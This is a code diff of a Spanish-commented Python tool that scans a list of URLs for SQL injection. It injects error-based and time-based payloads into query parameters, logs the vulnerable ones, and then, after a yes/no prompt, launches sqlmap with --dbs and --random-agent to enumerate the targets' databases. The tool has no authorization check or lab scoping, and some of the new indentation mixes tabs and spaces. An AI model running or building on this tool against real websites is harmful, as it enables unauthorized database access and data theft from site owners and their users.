@@ -1,18 +1,42 @@
 import argparse
 import requests
-from urllib.parse import quote, urlparse, parse_qsl, urlencode
 from colorama import init, Fore, Style, Back 
 import time
 import csv
 import subprocess
+from urllib.parse import quote, urlparse, parse_qsl, urlencode, urlunparse
+from tqdm import tqdm
 
 init(autoreset=True)  # Inicializar Colorama para que los estilos se reseteen automáticamente
 
 def encode_payload(payload):
     # Codificar el payload usando codificación URL
     return quote(payload)
+    
+def make_request(url, retries=5, backoff_factor=0.3):
+    """Realiza una solicitud GET con reintentos en caso de error."""
+    parsed_url = urlparse(url)
+    
+    # Asegurarse de que la URL usa el puerto correcto
+    if parsed_url.scheme == "http" and parsed_url.port is None:
+        url = urlunparse(parsed_url._replace(netloc=f"{parsed_url.hostname}:80"))
+    elif parsed_url.scheme == "https" and parsed_url.port is None:
+        url = urlunparse(parsed_url._replace(netloc=f"{parsed_url.hostname}:443"))
+    
+    for i in range(retries):
+        try:
+            response = requests.get(url)
+            return response
+        except requests.exceptions.ConnectionError as e:
+            print(Fore.RED + f"Error de conexión al intentar acceder a {url}")
+            time.sleep(backoff_factor * (2 ** i))
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + f"Error al intentar acceder a {url}")
+            break
+    print(Fore.RED + f"Error: Máximo de reintentos alcanzado para {url}")
+    return None
 
-def detect_sqli(url, results):
+def detect_sqli(url, results, progress_bar):
     # Payloads específicos para diferentes gestores de bases de datos
     error_based_payloads = {
         "MySQL": "' OR '1'='1",
@@ -64,7 +88,9 @@ def detect_sqli(url, results):
             modified_query = urlencode(query_params)
             target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
             
-            response = requests.get(target_url)
+            response = make_request(target_url)
+            if response is None:
+                continue
             
             for error in dbms_errors.get(dbms, []):
                 if error.lower() in response.text.lower():
@@ -83,16 +109,14 @@ def detect_sqli(url, results):
         print(Fore.RESET + "----" * 15)
         results.append((url, vulnerable_params, "SQLi por Error"))
     else:
-        # Si no se detecta SQLi con errores, probar SQLi Blind
-        if detect_blind_sqli(url, query_params, blind_payloads):
-            print("{Style.BRIGHT}{Back.CYAN}Vulnerabilidad SQLi Blind Detectada!{Back.RESET}\n{Fore.WHITE}Tipo: {Fore.GREEN}SQLi Blind\n{Fore.WHITE}URL: {Fore.GREEN}{url}\n{Fore.WHITE}DBMS: {Fore.GREEN}{dbms_used}\n{Fore.WHITE}Errores: {Fore.GREEN}{', '.join(found_errors)}\n{Fore.WHITE}Parámetros Vulnerables: {Fore.GREEN}{', '.join(vulnerable_params)}")
-            print(Fore.RESET + "----" * 15)
-            results.append((url, list(query_params.keys()), "SQLi Blind"))
+        if detect_blind_sqli(url, query_params, blind_payloads, results):
+            pass
         else:
             print(f"{Style.BRIGHT}{Back.MAGENTA}Análisis Completado.{Back.RESET}\n{Fore.RESET}URL: {Fore.YELLOW}{url}\n{Fore.RESET}Resultado: {Fore.RED}No se encontró vulnerabilidad SQLi.")
             print(Fore.RESET + "----" * 15)
+    progress_bar.update(1)
 
-def detect_blind_sqli(url, query_params, blind_payloads):
+def detect_blind_sqli(url, query_params, blind_payloads, results):
     for dbms, blind_payload in blind_payloads.items():
         for param in query_params:
             original_value = query_params[param]
@@ -101,12 +125,15 @@ def detect_blind_sqli(url, query_params, blind_payloads):
             target_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{urlparse(url).path}?{modified_query}"
             
             start_time = time.time()
-            response = requests.get(target_url)
+            response = make_request(target_url)
             end_time = time.time()
             
             query_params[param] = original_value  # Restaurar el valor original del parámetro
 
-            if end_time - start_time > 5:
+            if response and (end_time - start_time) > 5:
+                print(f"{Style.BRIGHT}{Back.CYAN}Vulnerabilidad SQLi Detectada!{Back.RESET}\n{Fore.WHITE}Tipo: {Fore.GREEN}SQLi Blind\n{Fore.WHITE}URL: {Fore.GREEN}{url}\n{Fore.WHITE}DBMS: {Fore.GREEN}{dbms}\n{Fore.WHITE}Parámetros Vulnerables: {Fore.GREEN}{param}")
+                print(Fore.RESET + "----" * 15)
+                results.append((url, [param], "SQLi Blind"))
                 return True
     return False
 
@@ -194,17 +221,22 @@ def save_to_html(results):
         </html>
         """)
 
-def attempt_exploit(results):
+def attempt_exploit(results, progress_bar):
     for result in results:
         url = result[0]
         params = result[1]
+        sqli_type = result[2]
         for param in params:
-            print(f"{Back.BLUE}{Fore.RESET}Ejecutando sqlmap en {url} con el parámetro {param}...")
+            print(f"{Back.BLUE}{Fore.RESET}Ejecutando sqlmap en {url} con el parámetro {param} para {sqli_type}...")
             try:
-                subprocess.run(["sqlmap", "-u", url, "-p", param, "--dbs", "--batch", "--random-agent", "--time-sec", "2", "--level", "5"], check=True)
+                if sqli_type == "SQLi por Error":
+                    subprocess.run(["sqlmap", "-u", url, "-p", param, "--dbs", "--batch", "--random-agent"], check=True)
+                elif sqli_type == "SQLi Blind":
+                    subprocess.run(["sqlmap", "-u", url, "-p", param, "--dbs", "--technique=B", "--batch", "--random-agent",  "--time-sec", "2", "--level", "5"], check=True)
             except subprocess.CalledProcessError as e:
                 print(Fore.RED + f"Error al ejecutar sqlmap en {url} con el parámetro {param}: {e}")
             print(Fore.RESET + "----" * 15)
+        progress_bar.update(1)
 
 def main(args):
     results = []
@@ -219,34 +251,36 @@ def main(args):
     except Exception as e:
         print(f"Error al leer el archivo de URLs: {e}")
         return
-
-    # Ejecutar la detección de SQLi para cada URL
-    for url in urls:
-        url = url.strip()  # Limpiar espacios en blanco y saltos de línea
-        if url:  # Asegurar que la URL no esté vacía
-            detect_sqli(url, results)
-    
-    # Almacenar las URLs vulnerables en archivos
-    if results:
-        save_to_csv(results)
-        save_to_txt(results)
-        save_to_html(results)
+    total_steps = len(urls) + 1  # +1 para el intento de explotación
+    with tqdm(total=total_steps, desc="Progreso Total", unit="paso") as progress_bar:
         
-        print(Back.YELLOW + Fore.BLACK + "[!] Las URLs vulnerables se han guardado en 'vulnerable_urls.csv', 'vulnerable_urls.txt', y 'vulnerable_urls.html'")
-        print(Fore.RESET + "----" * 15)
-        
-        # Imprimir resumen final
+	    # Ejecutar la detección de SQLi para cada URL
+        for url in urls:
+            url = url.strip()  # Limpiar espacios en blanco y saltos de línea
+            if url:  # Asegurar que la URL no esté vacía
+                detect_sqli(url, results, progress_bar)
+	    
+	    # Almacenar las URLs vulnerables en archivos
+        if results:
+         save_to_csv(results)
+         save_to_txt(results)
+         save_to_html(results)
+         print(Back.YELLOW + Fore.BLACK + "[!] Las URLs vulnerables se han guardado en 'vulnerable_urls.csv', 'vulnerable_urls.txt', y 'vulnerable_urls.html'")
+         print(Fore.RESET + "----" * 15)
+		
+		# Imprimir resumen final
         print(Back.GREEN + Fore.BLACK + "\nResumen de URLs y parámetros vulnerables:")
         for result in results:
             print(f"{Fore.RESET}{result[2]}: {Style.BRIGHT}{Fore.GREEN}{result[0]} {Fore.CYAN}(Parámetros vulnerables: {', '.join(result[1])})")
-        
-        # Preguntar si se desea intentar explotar las vulnerabilidades
+		
+		# Preguntar si se desea intentar explotar las vulnerabilidades
         print(Fore.RESET + "----" * 15)
         choice = input(Style.BRIGHT + Fore.YELLOW + "\n¿Desea intentar explotar las vulnerabilidades detectadas con sqlmap? (s/n): ").strip().lower()
         if choice == 's':
-            attempt_exploit(results)
-    else:
-        print(Style.BRIGHT + Fore.CYAN + "Descubrimiento finalizado!!!")
+            attempt_exploit(results, progress_bar)
+        else:
+            print(Style.BRIGHT + Fore.CYAN + "Descubrimiento finalizado!!!\n")
+        progress_bar.update(1)
 
 if __name__ == "__main__":
     print(Style.BRIGHT + Fore.GREEN + """
